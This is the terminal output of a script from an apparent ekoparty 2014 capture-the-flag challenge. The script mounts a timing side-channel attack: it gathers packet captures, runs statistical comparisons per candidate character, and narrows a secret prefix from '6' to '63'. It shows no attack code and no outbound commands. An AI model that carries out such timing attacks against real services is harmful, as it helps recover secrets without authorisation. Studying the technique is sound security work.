user@computer:~/code/2014_ekoparty/hue$ python ./collect_data.py 6
CURRENT_GUESS:  6
Collecting data:
Making new username generators with prefix: 6
0 0.021627 4623.860655
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-38-29.pcap
Calculating next guess...
Key Count (Number of loaded samples)
k1 k2 p
{}
Collecting data:
100 2.560279 39.390981
200 4.747224 45.725888
300 6.926324 45.890504
400 9.104847 45.902663
500 11.282950 45.911512
600 13.462740 45.875978
700 15.653822 45.639552
800 17.840460 45.732304
900 20.023453 45.808669
1000 22.205781 45.822626
1100 24.386795 45.850232
1200 26.568965 45.825946
1300 28.749912 45.851640
1400 30.930166 45.866216
1500 33.109508 45.885409
1600 35.287904 45.905336
1700 37.466233 45.906748
1800 39.646420 45.867625
1900 41.825421 45.892588
2000 44.003611 45.909677
2100 46.183542 45.873013
2200 48.362106 45.901794
2300 50.540021 45.915477
2400 52.719546 45.881554
2500 54.899569 45.871077
2600 57.081114 45.839072
2700 59.264197 45.806778
2800 61.444506 45.865062
2900 63.624962 45.861963
3000 65.804903 45.872802
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-38-55.pcap
Parsing  data/2014-10-30-14-39-26.pcap
Parsing  data/2014-10-30-14-39-41.pcap
Parsing  data/2014-10-30-14-39-56.pcap
Parsing  data/2014-10-30-14-40-11.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 339
61 339
62 338
63 339
64 339
65 339
66 338
67 338
Collecting data:
3100 68.770286 33.722456
3200 70.954811 45.776542
3300 73.134617 45.875642
3400 75.312449 45.917226
3500 77.494278 45.833107
3600 79.676709 45.820464
3700 81.858196 45.840290
3800 84.037181 45.892925
3900 86.215058 45.916276
4000 88.397135 45.827898
4100 90.577394 45.866111
4200 92.757857 45.861818
4300 94.938332 45.861567
4400 97.118461 45.868844
4500 99.298367 45.873540
4600 101.478057 45.878086
4700 103.657114 45.891408
4800 105.837663 45.860012
4900 108.018343 45.857255
5000 110.201840 45.798095
5100 112.383543 45.835751
5200 114.566995 45.799035
5300 116.753275 45.739800
5400 118.932012 45.898148
5500 121.120100 45.702002
5600 123.302509 45.820924
5700 125.483746 45.845546
5800 127.662486 45.898087
5900 129.854763 45.614675
6000 132.034221 45.882969
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-40-26.pcap
Parsing  data/2014-10-30-14-40-41.pcap
Parsing  data/2014-10-30-14-40-56.pcap
Parsing  data/2014-10-30-14-41-11.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 678
61 678
62 677
63 678
64 678
65 678
66 678
67 678
Collecting data:
6100 135.028442 33.397666
6200 137.206501 45.912441
6300 139.384902 45.905231
6400 141.562740 45.917096
6500 143.740513 45.918468
6600 145.918213 45.920006
6700 148.095975 45.918704
6800 150.273495 45.923802
6900 152.451063 45.922792
7000 154.629555 45.903311
7100 156.806886 45.927790
7200 158.986539 45.878859
7300 161.168048 45.839829
7400 163.350952 45.810540
7500 165.531018 45.870169
7600 167.715187 45.784002
7700 169.893584 45.905316
7800 172.082178 45.691433
7900 174.267471 45.760455
8000 176.460173 45.605831
8100 178.637732 45.922983
8200 180.815834 45.911532
8300 182.994070 45.908708
8400 185.172451 45.905653
8500 187.349864 45.926060
8600 189.527514 45.921062
8700 191.705851 45.906577
8800 193.894720 45.685694
8900 196.077368 45.815909
9000 198.256492 45.889997
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-41-26.pcap
Parsing  data/2014-10-30-14-41-41.pcap
Parsing  data/2014-10-30-14-41-56.pcap
Parsing  data/2014-10-30-14-42-11.pcap
Parsing  data/2014-10-30-14-42-26.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 1103
61 1103
62 1102
63 1103
64 1104
65 1103
66 1104
67 1103
Collecting data:
9100 201.375308 32.063451
9200 203.560968 45.752773
9300 205.746618 45.752977
9400 207.925782 45.889159
9500 210.105157 45.884711
9600 212.284545 45.884445
9700 214.464258 45.877599
9800 216.642893 45.900297
9900 218.821563 45.899564
10000 221.000613 45.891559
10100 223.179391 45.897289
10200 225.358022 45.900383
10300 227.536930 45.894547
10400 229.715546 45.900699
10500 231.894930 45.884525
10600 234.073385 45.904095
10700 236.251991 45.900910
10800 238.430495 45.903060
10900 240.609984 45.882317
11000 242.789269 45.886609
11100 244.968575 45.886167
11200 247.147441 45.895436
11300 249.326139 45.898971
11400 251.504709 45.901669
11500 253.684055 45.885323
11600 255.863132 45.890992
11700 258.041398 45.908074
11800 260.219798 45.905251
11900 262.398714 45.894381
12000 264.577290 45.901543
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-42-41.pcap
Parsing  data/2014-10-30-14-42-56.pcap
Parsing  data/2014-10-30-14-43-11.pcap
Parsing  data/2014-10-30-14-43-26.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 1441
61 1442
62 1441
63 1442
64 1442
65 1442
66 1441
67 1442
Collecting data:
12100 267.644383 32.604164
12200 269.823472 45.890735
12300 272.014328 45.644260
12400 274.193681 45.885178
12500 276.372362 45.899328
12600 278.553728 45.842835
12700 280.731744 45.913346
12800 282.909836 45.911743
12900 285.087513 45.920494
13000 287.265823 45.907145
13100 289.443758 45.915055
13200 291.622319 45.901860
13300 293.800612 45.907507
13400 295.978773 45.910286
13500 298.156513 45.919167
13600 300.334703 45.909677
13700 302.513263 45.901880
13800 304.691623 45.906095
13900 306.869501 45.916251
14000 309.047699 45.909512
14100 311.225366 45.920700
14200 313.403015 45.921082
14300 315.581110 45.911683
14400 317.758788 45.920469
14500 319.936427 45.921293
14600 322.115036 45.900850
14700 324.292761 45.919479
14800 326.470392 45.921464
14900 328.648012 45.921696
15000 330.826049 45.912899
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-43-41.pcap
Parsing  data/2014-10-30-14-43-56.pcap
Parsing  data/2014-10-30-14-44-11.pcap
Parsing  data/2014-10-30-14-44-26.pcap
Parsing  data/2014-10-30-14-44-41.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 1866
61 1867
62 1866
63 1868
64 1867
65 1867
66 1866
67 1867
k1 k2 p
60  61  0.745776611268
60  62  0.569713891959
60  63  0.0384691630032
60  64  0.356108033412
60  65  0.0932851159515
60  66  0.163538051857
60  67  0.235267089183
61  62  0.968295642089
61  63  0.145461823862
61  64  0.879786384643
61  65  0.239543913226
61  66  0.573927218369
61  67  0.431623598345
62  63  0.29059476561
62  64  0.89755235127
62  65  0.229938963261
62  66  0.62212966856
62  67  0.27193389468
63  64  0.319574778535
63  65  0.738183038294
63  66  0.802666698653
63  67  0.0185195649503
64  65  0.55233700924
64  66  0.225315690521
64  67  0.353552306523
65  66  0.423743728859
65  67  0.0383801224505
66  67  0.0808810390642
{'60': 2, '63': 2, '65': 2, '66': 1, '67': 3}
Collecting data:
15100 334.134230 30.228092
15200 336.312357 45.911009
15300 338.490041 45.920343
15400 340.667597 45.923043
15500 342.845239 45.921233
15600 345.023184 45.914839
15700 347.201178 45.913808
15800 349.378710 45.923551
15900 351.556944 45.908748
16000 353.734726 45.918282
16100 355.912207 45.924622
16200 358.089909 45.919966
16300 360.267526 45.921761
16400 362.445700 45.910014
16500 364.623360 45.920851
16600 366.802642 45.886669
16700 368.996022 45.591738
16800 371.173698 45.920514
16900 373.351224 45.923677
17000 375.529829 45.900930
17100 377.707588 45.918765
17200 379.885611 45.913195
17300 382.063820 45.909275
17400 384.241410 45.922329
17500 386.419193 45.918257
17600 388.596458 45.929183
17700 390.774238 45.918317
17800 392.951720 45.924607
17900 395.129653 45.915095
18000 397.307852 45.909486
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-44-56.pcap
Parsing  data/2014-10-30-14-45-11.pcap
Parsing  data/2014-10-30-14-45-26.pcap
Parsing  data/2014-10-30-14-45-41.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 2204
61 2204
62 2204
63 2205
64 2205
65 2205
66 2204
67 2205
k1 k2 p
60  61  0.723318441908
60  62  0.67441787709
60  63  0.0203974441367
60  64  0.393329185207
60  65  0.0823746660633
60  66  0.178772639455
60  67  0.791771240358
61  62  0.911385807738
61  63  0.0197481071052
61  64  0.636673692749
61  65  0.103179365284
61  66  0.366631363863
61  67  0.715375778252
62  63  0.0474212332305
62  64  0.882380273963
62  65  0.223882706259
62  66  0.522583664011
62  67  0.210653881876
63  64  0.113652966688
63  65  0.784096101391
63  66  0.32501173728
63  67  0.00299963339765
64  65  0.619647080977
64  66  0.321860514978
64  67  0.142281052761
65  66  0.314740497247
65  67  0.0169617156377
66  67  0.0441083110541
{'60': 2, '61': 1, '62': 1, '63': 4, '65': 2, '66': 1, '67': 3}
Collecting data:
18100 400.587751 30.488745
18200 402.765493 45.919122
18300 404.942970 45.924708
18400 407.120563 45.922264
18500 409.298486 45.915306
18600 411.476858 45.905839
18700 413.654985 45.911009
18800 415.832600 45.921796
18900 418.010456 45.916719
19000 420.188053 45.922178
19100 422.365999 45.914824
19200 424.544027 45.913090
19300 426.722022 45.913788
19400 428.899602 45.922540
19500 431.077279 45.920489
19600 433.254933 45.920977
19700 435.432344 45.926105
19800 437.610731 45.905522
19900 439.788209 45.924692
20000 441.967106 45.894778
20100 444.144705 45.922138
20200 446.322246 45.923360
20300 448.500001 45.918850
20400 450.678328 45.906788
20500 452.856247 45.915392
20600 455.034526 45.907798
20700 457.212054 45.923637
20800 459.389595 45.923360
20900 461.567243 45.921102
21000 463.745005 45.918699
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-45-56.pcap
Parsing  data/2014-10-30-14-46-11.pcap
Parsing  data/2014-10-30-14-46-26.pcap
Parsing  data/2014-10-30-14-46-41.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 2542
61 2542
62 2542
63 2543
64 2543
65 2543
66 2542
67 2543
k1 k2 p
60  61  0.767743993177
60  62  0.589013144587
60  63  0.0215347043132
60  64  0.556551745296
60  65  0.0790238768729
60  66  0.211828872526
60  67  0.50254727053
61  62  0.92927123688
61  63  0.00774545135265
61  64  0.362821666535
61  65  0.0306434634527
61  66  0.164565239451
61  67  0.556699137776
62  63  0.00783455286715
62  64  0.553673280126
62  65  0.0772698903071
62  66  0.282801173493
62  67  0.337274640166
63  64  0.0903097608878
63  65  0.459993423679
63  66  0.285907420161
63  67  0.000731656064219
64  65  0.596330886669
64  66  0.286127052887
64  67  0.119236856244
65  66  0.323496384337
65  67  0.00858844339483
66  67  0.0283085614466
{'60': 2, '61': 2, '62': 2, '63': 5, '64': 1, '65': 4, '66': 1, '67': 3}
Collecting data:
21100 467.088616 29.907785
21200 469.266754 45.910778
21300 471.445164 45.905040
21400 473.623085 45.915347
21500 475.800727 45.921228
21600 477.978359 45.921444
21700 480.156253 45.915915
21800 482.334374 45.911135
21900 484.511894 45.923802
22000 486.689370 45.924733
22100 488.866671 45.928419
22200 491.044976 45.907255
22300 493.224593 45.879622
22400 495.403188 45.901141
22500 497.582354 45.889114
22600 499.761685 45.885640
22700 501.941131 45.883220
22800 504.119714 45.901398
22900 506.298599 45.895034
23000 508.477767 45.889074
23100 510.656911 45.889576
23200 512.834789 45.916256
23300 515.012902 45.911301
23400 517.190696 45.918026
23500 519.368286 45.922324
23600 521.546119 45.917206
23700 523.723533 45.926040
23800 525.901785 45.908366
23900 528.079344 45.922983
24000 530.257081 45.919227
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-46-56.pcap
Parsing  data/2014-10-30-14-47-11.pcap
Parsing  data/2014-10-30-14-47-26.pcap
Parsing  data/2014-10-30-14-47-41.pcap
Parsing  data/2014-10-30-14-47-56.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 2966
61 2965
62 2966
63 2966
64 2966
65 2967
66 2966
67 2967
k1 k2 p
60  61  0.646538135419
60  62  0.209644070927
60  63  0.022477691996
60  64  0.56189497273
60  65  0.170775476106
60  66  0.285881121015
60  67  0.270878098902
61  62  0.800590399381
61  63  0.00345269112106
61  64  0.657345720403
61  65  0.0531490101454
61  66  0.123889000409
61  67  0.67405994369
62  63  0.00336584600158
62  64  0.76798839302
62  65  0.0730078014871
62  66  0.310572441627
62  67  0.409836382906
63  64  0.0198317323515
63  65  0.456040293618
63  66  0.200772148568
63  67  0.000376515704214
64  65  0.430942074114
64  66  0.517720710494
64  67  0.469836836762
65  66  0.389906669624
65  67  0.0213672802059
66  67  0.0369033462036
{'60': 1, '61': 2, '62': 2, '63': 5, '64': 1, '65': 3, '66': 1, '67': 3}
Collecting data:
24100 533.733093 28.768600
24200 535.910780 45.920283
24300 538.088315 45.923486
24400 540.266116 45.917875
24500 542.444254 45.910778
24600 544.622220 45.914397
24700 546.799791 45.922726
24800 548.977133 45.927559
24900 551.155111 45.914145
25000 553.333077 45.914402
25100 555.510868 45.918086
25200 557.688212 45.927519
25300 559.865895 45.920363
25400 562.046521 45.858393
25500 564.242872 45.530062
25600 566.420532 45.920851
25700 568.598731 45.909486
25800 570.776277 45.923254
25900 572.954084 45.917754
26000 575.131745 45.920826
26100 577.309317 45.922706
26200 579.487038 45.919564
26300 581.666091 45.891499
26400 583.844681 45.901247
26500 586.023734 45.891494
26600 588.203038 45.886212
26700 590.382323 45.886609
26800 592.561629 45.886167
26900 594.740403 45.897374
27000 596.919536 45.889807
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-48-11.pcap
Parsing  data/2014-10-30-14-48-26.pcap
Parsing  data/2014-10-30-14-48-41.pcap
Parsing  data/2014-10-30-14-48-56.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 3303
61 3301
62 3302
63 3303
64 3303
65 3304
66 3303
67 3304
k1 k2 p
60  61  0.907053491134
60  62  0.531770668407
60  63  0.0294111097985
60  64  0.849398515618
60  65  0.153742436839
60  66  0.38948100426
60  67  0.529280124385
61  62  0.757800324431
61  63  0.0205637143235
61  64  0.604145265073
61  65  0.123142700964
61  66  0.313817555122
61  67  0.603058249281
62  63  0.0238880157196
62  64  0.58108882423
62  65  0.113768334119
62  66  0.304989863555
62  67  0.255430567907
63  64  0.0861859495717
63  65  0.360811331981
63  66  0.23396684589
63  67  0.00184373179903
64  65  0.571946757817
64  66  0.547518057379
64  67  0.23228380965
65  66  0.320782871821
65  67  0.0143879884373
66  67  0.0482196586093
{'60': 1, '61': 1, '62': 1, '63': 5, '64': 1, '65': 1, '66': 1, '67': 3}
Collecting data:
27100 600.365867 29.016365
27200 602.543771 45.915708
27300 604.721587 45.917563
27400 606.898756 45.931205
27500 609.076469 45.919735
27600 611.253937 45.924899
27700 613.431661 45.919499
27800 615.609597 45.915035
27900 617.787633 45.912924
28000 619.965103 45.924858
28100 622.144096 45.892754
28200 624.322628 45.902473
28300 626.501341 45.898655
28400 628.679984 45.900132
28500 630.858543 45.901905
28600 633.036168 45.921585
28700 635.213626 45.925115
28800 637.390862 45.929792
28900 639.568115 45.929435
29000 641.745631 45.923888
29100 643.922688 45.933569
29200 646.100275 45.922390
29300 648.278000 45.919479
29400 650.455484 45.924567
29500 652.633398 45.915492
29600 654.810840 45.925447
29700 656.988323 45.924587
29800 659.165428 45.932558
29900 661.342856 45.925743
30000 663.521338 45.903522
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-49-11.pcap
Parsing  data/2014-10-30-14-49-26.pcap
Parsing  data/2014-10-30-14-49-41.pcap
Parsing  data/2014-10-30-14-49-56.pcap
Parsing  data/2014-10-30-14-50-11.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 3725
61 3725
62 3726
63 3727
64 3725
65 3727
66 3725
67 3727
k1 k2 p
60  61  0.638301130234
60  62  0.400639736028
60  63  0.0813334750871
60  64  0.958689722628
60  65  0.666388822267
60  66  0.640801520343
60  67  0.614694569832
61  62  0.733392064519
61  63  0.0112949388912
61  64  0.403548446466
61  65  0.219244910379
61  66  0.183524307004
61  67  0.755162854173
62  63  0.0424343778197
62  64  0.473992716741
62  65  0.206079041446
62  66  0.185291993347
62  67  0.330427306341
63  64  0.195463806032
63  65  0.240908228993
63  66  0.458100976046
63  67  0.0124952776742
64  65  0.747756535632
64  66  0.827644532584
64  67  0.281853332778
65  66  0.236957849382
65  67  0.146254339871
66  67  0.0961548836307
{'60': 1, '61': 1, '62': 1, '63': 4, '66': 1, '67': 2}
Collecting data:
30100 667.135502 27.668915
30200 669.313583 45.911974
30300 671.491643 45.912421
30400 673.669668 45.913155
30500 675.847543 45.916317
30600 678.025689 45.910602
30700 680.203440 45.918936
30800 682.381995 45.901985
30900 684.559733 45.919207
31000 686.738005 45.907949
31100 688.915943 45.914990
31200 691.094082 45.910748
31300 693.272198 45.911240
31400 695.450402 45.909381
31500 697.628557 45.910416
31600 699.806028 45.924833
31700 701.984521 45.903296
31800 704.163551 45.891976
31900 706.342501 45.893668
32000 708.521732 45.887743
32100 710.701376 45.879055
32200 712.880857 45.882482
32300 715.059984 45.889937
32400 717.239123 45.889681
32500 719.418420 45.886358
32600 721.597319 45.894738
32700 723.774917 45.922158
32800 725.952806 45.916025
32900 728.130928 45.911110
33000 730.308526 45.922158
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-50-26.pcap
Parsing  data/2014-10-30-14-50-41.pcap
Parsing  data/2014-10-30-14-50-56.pcap
Parsing  data/2014-10-30-14-51-11.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 4062
61 4061
62 4062
63 4063
64 4062
65 4062
66 4061
67 4062
k1 k2 p
60  61  0.622851706861
60  62  0.756034737034
60  63  0.0328589981501
60  64  0.76416282583
60  65  0.319183635112
60  66  0.442402158121
60  67  0.895755086672
61  62  0.602777166277
61  63  0.00663814296469
61  64  0.20884765263
61  65  0.100525269392
61  66  0.130087339909
61  67  0.778205963681
62  63  0.0255883613815
62  64  0.452618411231
62  65  0.2842711656
62  66  0.413374003556
62  67  0.286096934223
63  64  0.182550565703
63  65  0.425821632797
63  66  0.420841773921
63  67  0.0273053436056
64  65  0.806380198301
64  66  0.924748080108
64  67  0.511376054886
65  66  0.185375551051
65  67  0.198624710653
66  67  0.262365523551
{'60': 1, '61': 1, '62': 1, '63': 4, '67': 1}
Collecting data:
33100 733.865612 28.112899
33200 736.043943 45.906708
33300 738.221743 45.917895
33400 740.399266 45.923742
33500 742.577529 45.908140
33600 744.755143 45.921821
33700 746.932618 45.924748
33800 749.110441 45.917417
33900 751.288576 45.910833
34000 753.467427 45.895752
34100 755.645449 45.913220
34200 757.823082 45.921419
34300 760.028380 45.345347
34400 762.206191 45.917664
34500 764.383744 45.923109
34600 766.562038 45.907487
34700 768.739761 45.919519
34800 770.918222 45.903970
34900 773.097298 45.891007
35000 775.276443 45.889561
35100 777.455166 45.898444
35200 779.634195 45.892001
35300 781.813945 45.876821
35400 783.992616 45.899544
35500 786.171696 45.890926
35600 788.350260 45.901794
35700 790.529192 45.894045
35800 792.708181 45.892839
35900 794.887428 45.887412
36000 797.067022 45.880103
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-51-26.pcap
Parsing  data/2014-10-30-14-51-41.pcap
Parsing  data/2014-10-30-14-51-56.pcap
Parsing  data/2014-10-30-14-52-11.pcap
Parsing  data/2014-10-30-14-52-26.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 4484
61 4483
62 4484
63 4485
64 4484
65 4485
66 4483
67 4485
k1 k2 p
60  61  0.832188367704
60  62  0.504447197373
60  63  0.0518077904204
60  64  0.93017898822
60  65  0.710828050181
60  66  0.380595938893
60  67  0.709747230658
61  62  0.751089839994
61  63  0.0171246486279
61  64  0.419476694047
61  65  0.352514097221
61  66  0.106189615115
61  67  0.595487094033
62  63  0.0172279395933
62  64  0.327690114239
62  65  0.482321465103
62  66  0.152791102017
62  67  0.410229049155
63  64  0.174815673393
63  65  0.216780733289
63  66  0.679956883894
63  67  0.035639156396
64  65  0.953028156125
64  66  0.828783976977
64  67  0.559239373496
65  66  0.500540218658
65  67  0.446786534603
66  67  0.203894553612
{'60': 1, '61': 1, '62': 1, '63': 4, '67': 1}
Collecting data:
36100 800.801749 26.775719
36200 802.981349 45.879978
36300 805.160458 45.890314
36400 807.339467 45.892423
36500 809.517956 45.903377
36600 811.697418 45.882884
36700 813.876404 45.892905
36800 816.055545 45.889641
36900 818.235136 45.880169
37000 820.413870 45.898213
37100 822.593468 45.880023
37200 824.771049 45.922515
37300 826.949584 45.902407
37400 829.127248 45.920766
37500 831.305878 45.900408
37600 833.485808 45.873028
37700 835.664763 45.893562
37800 837.843624 45.895536
37900 840.022494 45.895350
38000 842.201780 45.886588
38100 844.380566 45.897118
38200 846.559136 45.901674
38300 848.737973 45.896043
38400 850.916609 45.900277
38500 853.095640 45.891961
38600 855.274123 45.903502
38700 857.453313 45.888607
38800 859.632014 45.898911
38900 861.811450 45.883431
39000 863.990260 45.896611
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-14-52-41.pcap
Parsing  data/2014-10-30-14-52-56.pcap
Parsing  data/2014-10-30-14-53-11.pcap
Parsing  data/2014-10-30-14-53-26.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 4819
61 4818
62 4819
63 4820
64 4818
65 4820
66 4819
67 4821
k1 k2 p
60  61  0.900982078528
60  62  0.421292651651
60  63  0.00708076547625
60  64  0.656490543299
60  65  0.871555964144
60  66  0.316505311207
60  67  0.750351453122
61  62  0.75168698411
61  63  0.00103421133877
61  64  0.155854669409
61  65  0.316653945218
61  66  0.0537265495091
61  67  0.624929061742
62  63  0.00241865746281
62  64  0.167542712954
62  65  0.419418396517
62  66  0.0828882136098
62  67  0.394734050454
63  64  0.0690905738121
63  65  0.0519960763577
63  66  0.400654289089
63  67  0.0161971236126
64  65  0.786833070947
64  66  0.819872295817
64  67  0.641386353034
65  66  0.528953369347
65  67  0.785475818759
66  67  0.284238637131
{'60': 1, '61': 2, '62': 2, '63': 6, '64': 1, '65': 1, '66': 2, '67': 1}
CHANGING GUESS:  63
Guess time:  865.490952969
mkdir -p data
mkdir -p tmp
rm -rf data/*
rm -rf tmp/*
rm -rf *.pyc
Collecting data:
Making new username generators with prefix: 63
39100 867.693579 27.002806
39200 869.872117 45.902342
39300 872.050845 45.898344
39400 874.228291 45.925361
39500 876.406040 45.918976
39600 878.583764 45.919499
39700 880.761378 45.921821
39800 882.939225 45.916910
39900 885.116650 45.925804
40000 887.294867 45.909110
40100 889.472389 45.923762
40200 891.650673 45.907698
40300 893.828292 45.921711
40400 896.005950 45.920896
40500 898.183102 45.931562
40600 900.360954 45.916804
40700 902.538922 45.914356
40800 904.716503 45.922515
40900 906.894215 45.919755
41000 909.072253 45.912884
41100 911.249563 45.928233
41200 913.426702 45.931839
41300 915.604612 45.915578
41400 917.782104 45.924396
41500 919.959106 45.934731
41600 922.136962 45.916719
41700 924.314401 45.925512
41800 926.491645 45.929621
41900 928.669295 45.921062
42000 930.846765 45.924858
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-14-53-56.pcap
Parsing  data/2014-10-30-14-54-11.pcap
Parsing  data/2014-10-30-14-54-26.pcap
Parsing  data/2014-10-30-14-54-41.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 345
631 344
632 344
633 344
634 344
635 344
636 344
637 345
Collecting data:
42100 933.841663 33.390118
42200 936.019382 45.919609
42300 938.197066 45.920343
42400 940.374774 45.919841
42500 942.552377 45.922053
42600 944.730025 45.921102
42700 946.907660 45.921379
42800 949.085344 45.920343
42900 951.263256 45.915538
43000 953.441230 45.914231
43100 955.618367 45.931884
43200 957.795990 45.921630
43300 959.973603 45.921842
43400 962.151766 45.910245
43500 964.329397 45.921464
43600 966.507021 45.921610
43700 968.684634 45.921842
43800 970.861997 45.927111
43900 973.039090 45.932815
44000 975.216859 45.918549
44100 977.394360 45.924205
44200 979.572474 45.911281
44300 981.750983 45.902955
44400 983.928460 45.924708
44500 986.105983 45.923742
44600 988.283663 45.920429
44700 990.461387 45.919504
44800 992.639229 45.917010
44900 994.816914 45.920323
45000 996.994350 45.925577
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-14-54-56.pcap
Parsing  data/2014-10-30-14-55-11.pcap
Parsing  data/2014-10-30-14-55-26.pcap
Parsing  data/2014-10-30-14-55-41.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 684
631 684
632 683
633 684
634 684
635 684
636 683
637 685
Collecting data:
45100 999.983256 33.457056
45200 1002.160978 45.919544
45300 1004.338514 45.923466
45400 1006.516662 45.910562
45500 1008.694370 45.919841
45600 1010.871802 45.925658
45700 1013.051361 45.880841
45800 1015.228927 45.922832
45900 1017.406619 45.920177
46000 1019.584440 45.917458
46100 1021.762419 45.914125
46200 1023.940105 45.920303
46300 1026.117687 45.922495
46400 1028.295705 45.913301
46500 1030.473097 45.926503
46600 1032.650734 45.921339
46700 1034.828317 45.922475
46800 1037.006644 45.906788
46900 1039.185135 45.903332
47000 1041.363323 45.909723
47100 1043.541064 45.919142
47200 1045.718693 45.921505
47300 1047.896357 45.920766
47400 1050.073945 45.922369
47500 1052.252033 45.911828
47600 1054.429988 45.914633
47700 1056.607937 45.914753
47800 1058.785507 45.922752
47900 1060.963202 45.920112
48000 1063.141517 45.907044
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-14-55-56.pcap
Parsing  data/2014-10-30-14-56-11.pcap
Parsing  data/2014-10-30-14-56-26.pcap
Parsing  data/2014-10-30-14-56-41.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 1025
631 1024
632 1023
633 1023
634 1023
635 1023
636 1022
637 1025
Collecting data:
48100 1066.181621 32.893610
48200 1068.359183 45.922917
48300 1070.536856 45.920580
48400 1072.714721 45.916528
48500 1074.892188 45.924919
48600 1077.070127 45.914970
48700 1079.248223 45.911657
48800 1081.425781 45.923003
48900 1083.603251 45.924858
49000 1085.780788 45.923445
49100 1087.957993 45.930446
49200 1090.135800 45.917749
49300 1092.313270 45.924858
49400 1094.490409 45.931839
49500 1096.667980 45.922731
49600 1098.845806 45.917347
49700 1101.023693 45.916065
49800 1103.201604 45.915558
49900 1105.379249 45.921168
50000 1107.556736 45.924501
50100 1109.734040 45.928358
50200 1111.911842 45.917855
50300 1114.089415 45.922686
50400 1116.267094 45.920449
50500 1118.444762 45.920685
50600 1120.622896 45.910858
50700 1122.800127 45.929897
50800 1124.977796 45.920660
50900 1127.155477 45.920409
51000 1129.332968 45.924416
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-14-56-56.pcap
Parsing  data/2014-10-30-14-57-11.pcap
Parsing  data/2014-10-30-14-57-26.pcap
Parsing  data/2014-10-30-14-57-41.pcap
Parsing  data/2014-10-30-14-57-56.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 1450
631 1449
632 1448
633 1449
634 1449
635 1449
636 1448
637 1450
Collecting data:
51100 1132.480606 31.769853
51200 1134.658064 45.925110
51300 1136.836166 45.911532
51400 1139.014058 45.915960
51500 1141.191763 45.919906
51600 1143.369145 45.926714
51700 1145.547129 45.914020
51800 1147.724954 45.917367
51900 1149.902286 45.927770
52000 1152.079946 45.920851
52100 1154.257449 45.924164
52200 1156.435330 45.916191
52300 1158.612812 45.924602
52400 1160.790929 45.911215
52500 1162.969473 45.902216
52600 1165.147218 45.919061
52700 1167.324930 45.919755
52800 1169.502530 45.922113
52900 1171.681614 45.890846
53000 1173.860513 45.894738
53100 1176.039810 45.886358
53200 1178.241311 45.423551
53300 1180.428747 45.715626
53400 1182.608772 45.871031
53500 1184.789153 45.863543
53600 1186.969669 45.860704
53700 1189.149758 45.869687
53800 1191.327673 45.915477
53900 1193.505677 45.913597
54000 1195.684063 45.905547
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-14-58-11.pcap
Parsing  data/2014-10-30-14-58-26.pcap
Parsing  data/2014-10-30-14-58-41.pcap
Parsing  data/2014-10-30-14-58-56.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 1789
631 1787
632 1786
633 1787
634 1788
635 1788
636 1786
637 1789
k1 k2 p
630  631  0.519907913773
630  632  0.942644932373
630  633  0.88116745828
630  634  0.623032563803
630  635  0.339197977721
630  636  0.421125344164
630  637  0.163042615693
631  632  0.694659235235
631  633  0.575682515452
631  634  0.834005692229
631  635  0.214979317497
631  636  0.0835616235434
631  637  0.223846719825
632  633  0.70986493334
632  634  0.729169248609
632  635  0.216012769206
632  636  0.527823143443
632  637  0.0864993242402
633  634  0.681496570307
633  635  0.816925332874
633  636  0.539185089888
633  637  0.203560893214
634  635  0.286507468828
634  636  0.134518741497
634  637  0.327370566201
635  636  0.149691264611
635  637  0.227168699887
636  637  0.0146421953314
{'631': 1, '632': 1, '636': 2, '637': 2}
Collecting data:
54100 1198.900234 31.092874
54200 1201.077965 45.919353
54300 1203.256458 45.903291
54400 1205.434482 45.913175
54500 1207.612135 45.921002
54600 1209.790162 45.913110
54700 1211.967722 45.922963
54800 1214.144863 45.931794
54900 1216.322490 45.921550
55000 1218.499859 45.926986
55100 1220.677346 45.924501
55200 1222.855514 45.910140
55300 1225.033146 45.921439
55400 1227.210429 45.928806
55500 1229.388020 45.922304
55600 1231.565890 45.916422
55700 1233.743256 45.927051
55800 1235.921493 45.908688
55900 1238.099119 45.921570
56000 1240.276226 45.932513
56100 1242.453615 45.926568
56200 1244.631067 45.925236
56300 1246.809027 45.914527
56400 1248.986111 45.933001
56500 1251.164084 45.914251
56600 1253.341952 45.916462
56700 1255.519150 45.930597
56800 1257.696381 45.929897
56900 1259.873506 45.932136
57000 1262.051034 45.923637
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-14-59-11.pcap
Parsing  data/2014-10-30-14-59-26.pcap
Parsing  data/2014-10-30-14-59-41.pcap
Parsing  data/2014-10-30-14-59-56.pcap
Parsing  data/2014-10-30-15-00-11.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 2213
631 2211
632 2211
633 2213
634 2212
635 2212
